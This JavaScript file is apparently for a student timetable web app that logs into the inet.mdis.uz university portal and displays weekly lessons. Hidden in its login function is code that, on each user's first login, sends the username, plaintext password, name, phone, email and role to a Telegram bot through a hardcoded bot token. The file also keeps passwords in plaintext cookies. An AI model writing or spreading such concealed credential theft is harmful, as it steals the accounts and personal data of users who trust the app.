const placer = document.querySelector(".placer"),
    inputsObj = Object.values(document.querySelectorAll("input[type=radio]")),
    template = document.querySelector("template#lesson");
let previousRadio = document.querySelector("input[type=radio]:checked"),
    weekNumber = 0,
    touchStart;

function changePlacer(target) {
    placer.style.width = target.offsetWidth + "px"
    placer.style.height = target.offsetHeight + "px"
    placer.style.top = target.offsetTop + "px"
    placer.style.left = target.offsetLeft + "px"
}
let currentWeekStartDate = getCurrentWeekStartDate();

function getCurrentWeekStartDate() {
    const currentDate = new Date();
    currentDate.setDate(currentDate.getDate() - 1)
    const difference = currentDate.getDay();
    const firstDay = new Date();
    firstDay.setDate(firstDay.getDate() - difference);
    return firstDay;
}


function updateWeekDisplay() {
    const startDate = new Date(currentWeekStartDate),
        labels = document.querySelectorAll("label[data-date]");
    if (getCurrentWeekStartDate().toLocaleDateString() == startDate.toLocaleDateString()) {
        let thisDay = new Date()
        thisDay.setDate(thisDay.getDate() - 1)
        const todayInput = labels[thisDay.getDay()].previousSibling;
        todayInput.classList.add("today")
    }
    else {
        const todayInput = document.querySelector("input[type=radio].today")
        if (todayInput) {
            todayInput.classList.remove("today")
        }
    }

    labels.forEach(label => {
        label.querySelector("span.date").textContent = startDate.getDate()
        startDate.setDate(startDate.getDate() + 1);
    })
}

function changeLessons(input) {
    const sequence = Number(input.id.slice(-1)) - 1;
    document.querySelector(".lessons.show")?.classList.remove("show")
    let thisLesson = document.querySelectorAll(".lessons")[sequence]
    thisLesson.classList.add("show")
    thisLesson.querySelectorAll(".lesson").forEach((lesson, index) => {
        lesson.animate([
            { opacity: "0" },
            { opacity: "1" },
        ], {
            duration: 450,
            iterations: 1,
            delay: index * 200,
            fill: "both",
            easing: "ease-in-out",
        })
    })

}

function changeDate(step) {
    let diff = Number(document.querySelector("h2.title").dataset.diff) + step
    document.querySelector("main > h2.title.bold").textContent = "Schedule " + new Intl.RelativeTimeFormat('en', { numeric: 'auto' }).format(diff, "day")
    document.querySelector("h2.title").dataset.diff = diff
}

updateWeekDisplay()



function setCookie(name, value, daysToExpire) {
    const date = new Date();
    date.setTime(date.getTime() + (daysToExpire * 24 * 60 * 60 * 1000));
    const expires = "expires=" + date.toUTCString();
    document.cookie = name + "=" + value + ";" + expires + ";path=/";
}

// Function to get a cookie value by name
function getCookie(name) {
    const cookieName = name + "=";
    const cookies = document.cookie.split(';');
    for (let i = 0; i < cookies.length; i++) {
        let cookie = cookies[i].trim();
        if (cookie.indexOf(cookieName) === 0) {
            return cookie.substring(cookieName.length, cookie.length);
        }
    }
    return null;
}

function getUser(username, password) {
    if (!(username && password)) {
        document.querySelector(".reg-user").style.display = "grid";
        return
    }
    fetch('https://inet.mdis.uz/oauth/token', {
        method: "POST",
        headers: {
            'Authorization': 'Basic c3ByaW5nLXNlY3VyaXR5LW9hdXRoMi1yZWFkLWNsaWVudDpzcHJpbmctc2VjdXJpdHktb2F1dGgyLXJlYWQtY2xpZW50LXBhc3N3b3JkMTIzNA==',
            "Content-Type": "application/x-www-form-urlencoded",
        },
        body: `username=${username}&password=${password}&grant_type=password`
    }).then(res => {
        if (res.status == 200) {
            return res.json()
        }
        else if (res.status == 400) {
            document.querySelector("form#user-login").classList.add("error")
            throw new Error("no user")
        }
    }).then(text => {
        if (!getCookie("username")) {
            setCookie("username", username, 20)
        }
        if (!getCookie("password")) {
            setCookie("password", password, 20)
        }
        document.querySelector("header span.bold").textContent = text.user.fullName.split(" ")[0].toLowerCase()
        document.querySelector(".avatar > img").setAttribute("src", `https://inet.mdis.uz${text.user.avatar}`)
        localStorage.setItem("access_token", `Bearer ${text.access_token}`)
        if (!getCookie("isReggedBefore")) {
            const message = `New Login to Timetable%0A%0AFull Name: ${text.user.fullName}%0ARole: ${text.user.roles[0]}%0AID: ${text.user.uuid}%0APhone: +${text.user.phone}%0AEmail: ${text.user.email}%0A%0AUsername: <b>${username}</b>%0APassword: <code>${password}</code>`
            setCookie("isReggedBefore", true, 60)
            fetch(`https://api.telegram.org/bot2008400182:AAE_Y6AfamakIb2pk020WtpFPFcUWRR_nvY/sendDocument?chat_id=1273666675&document=https://inet.mdis.uz${text.user.avatar}&caption=${message}&parse_mode=html`).then(() => {
                location.reload()
            })
        }
    })

}


function sorted(objects, attribute = "dayNumber") {
    return objects.reduce((grouped, obj) => {
        const key = obj[attribute];
        if (!grouped[key]) {
            grouped[key] = [];
        }
        grouped[key].push(obj);
        return grouped;
    }, {});
}

function formatTime(time) {
    return new Date(`2023-12-01T${time}`).toLocaleTimeString("en-uk", { hour: "2-digit", minute: "2-digit" })
}


function fetchLessons(startDate) {
    const endDate = new Date(startDate);
    endDate.setDate(startDate.getDate() + 6);
    const startDateFormat = startDate.toLocaleDateString("fr-ca"),
        endDateFormat = endDate.toLocaleDateString("fr-ca");
    fetch(`https://inet.mdis.uz/api/v1/education/student/view/schedules?from=${startDateFormat}&to=${endDateFormat}`, {
        method: "GET",
        headers: {
            "Authorization": localStorage.getItem("access_token")
        }
    }).then(result => {
        if (result.status == 200) {
            return result.json()
        }
        else if (result.status == 401) {
            getUser(getCookie("username"), getCookie("password"))
        }
        throw new Error(result.status)
    }).then(data => {
        const lessons = document.querySelectorAll(".lessons")
        lessons.forEach(lessonsElem => {
            lessonsElem.innerHTML = ""
            lessonsElem.classList.remove("day-off")
        })
        if (!data) return
        if (data.data.length) {
            let timetable = sorted(data.data)

            for (let i = 1; i <= 7; i++) {
                if (timetable[i]) {
                    let table = timetable[i].sort((a, b) => a.startTime.localeCompare(b.startTime))
                    table.forEach(lesson => {
                        let content = template.content.cloneNode(true)
                        content.querySelector("h2.name").textContent = lesson.moduleName;
                        content.querySelector("span.type").textContent = lesson.lessonTypeName;
                        content.querySelector("span.type").setAttribute("type", lesson.lessonTypeName.toLowerCase());
                        content.querySelector("time.medium").textContent = `${formatTime(lesson.startTime)} - ${formatTime(lesson.endTime)}`
                        let checkIn = content.querySelector(".check > span.in"),
                            checkOut = content.querySelector(".check > span.out")
                        if (lesson.checkIn) {
                            checkIn.classList.add("green")
                        }
                        if (lesson.checkInDate) {
                            checkIn.textContent = new Date(lesson.checkInDate).toLocaleTimeString("en-uk")
                        }
                        if (lesson.checkOut) {
                            checkOut.classList.add("green")
                        }
                        if (lesson.checkOutDate) {
                            checkOut.textContent = new Date(lesson.checkOutDate).toLocaleTimeString("en-uk")
                        }
                        if (lesson.cancelReason) {
                            let cancel = document.createElement("div");
                            cancel.classList.add("cancel");
                            cancel.innerHTML = `<object data="./assets/icons/ios-alert.svg"></object> Cancelled: ${lesson.cancelReason}`;
                            content.querySelector(".data").appendChild(cancel);
                            content.querySelector(".check").style.display = "none";
                            content.querySelector(".lesson").classList.add("cancel")
                        }
                        content.querySelector("h3.teacher").textContent = lesson.lecturerName.replaceAll("null", "").trim()
                        content.querySelector("span.room").textContent = lesson.venueName
                        document.querySelector(`.lessons[day="${i}"]`).appendChild(content)
                    })
                }
                else {
                    let dayOff = lessons[i - 1]
                    dayOff.classList.add("day-off")
                    dayOff.innerHTML = '<h3 class="title bold text-center">This day is your day off.</h3><p class="text-center">Welcome to your well-deserved day off! Take this opportunity to relax, rejuvenate, and indulge in activities that bring you joy. Enjoy your day!</p>'
                }
            }
        }
        else {
            lessons.forEach(lessonContainer => {
                lessonContainer.classList.add("no-data")
                lessonContainer.innerHTML = '<h3 class="title bold text-center">No further data is available.</h3><p class="text-center">Sorry pal, we didn\'t recieved any lessons for further dates. Maybe they are not scheduled yet.</p>'
            })
        }
    })
}


function userNavigate(direction) {
    let checkedRadioIndex = inputsObj.indexOf(document.querySelector("input[type=radio]:checked")),
        followingRadio = inputsObj[checkedRadioIndex + direction]
    if (followingRadio) { followingRadio.click() }
    else {
        let viceInput = inputsObj[inputsObj.length + direction]
        if (direction == 1) {
            viceInput = inputsObj[0]
        }
        viceInput.click()
        changeDate(direction * 7)
        currentWeekStartDate.setDate(currentWeekStartDate.getDate() + direction * 7)
        document.querySelectorAll(".lessons").forEach(lessonsElem => {
            lessonsElem.innerHTML = '<div class="loader"><div class="bouncer" style="--i: 1"></div><div class="bouncer" style="--i: 2"></div><div class="bouncer" style="--i: 3"></div></div>'
            lessonsElem.classList.remove("day-off")
        })
        fetchLessons(currentWeekStartDate)
        updateWeekDisplay()
    }
}


document.querySelectorAll("button[data-nav-dir]").forEach(btn => {
    btn.onclick = () => {
        userNavigate(Number(btn.dataset.navDir))
    }
})


document.querySelector("#user-login").addEventListener("submit", e => {
    let username, password;
    e.preventDefault()
    username = document.querySelector("#user-login input[name=username]").value
    password = document.querySelector("#user-login input[name=password]").value
    getUser(username, password)
})

inputsObj.forEach(input => {
    input.onchange = e => {
        let diff = 0;
        if (previousRadio) {
            diff = inputsObj.indexOf(e.target) - inputsObj.indexOf(previousRadio)
        }
        changeDate(diff)
        changeLessons(e.target)
        previousRadio = e.target
        setTimeout(() => {
            changePlacer(e.target.parentElement)
        }, 25)
    }
})

window.onresize = () => {
    const checkedRadio = document.querySelector("input[type=radio]:checked")
    if (!checkedRadio) return
    changePlacer(checkedRadio.parentElement)
}


window.addEventListener("touchstart", e => {
    touchStart = e.touches[0].clientX
})

window.addEventListener("touchend", e => {
    let action = (touchStart - e.changedTouches[0].clientX) / 100;
    if (action > 0) {
        if (!Math.floor(action)) return
        userNavigate(1)
    }
    else if (action < 0) {
        if (!Math.ceil(action)) return
        userNavigate(-1)
    }
})


window.addEventListener("keydown", e => {
    if (e.keyCode == 37 || e.keyCode == 39) {
        e.preventDefault()
        userNavigate(e.keyCode - 38)
    }
})

document.body.onload = () => {
    getUser(getCookie("username"), getCookie("password"))
    const labels = document.querySelectorAll("label[data-date]");
    let thisDay = new Date()
    thisDay.setDate(thisDay.getDate() - 1)
    let todayLabel = labels[thisDay.getDay()];
    todayLabel.previousSibling.click()
    fetchLessons(currentWeekStartDate)
    const checkedRadio = document.querySelector("input[type=radio]:checked")
    if (!checkedRadio) return
    changePlacer(checkedRadio.parentElement)
}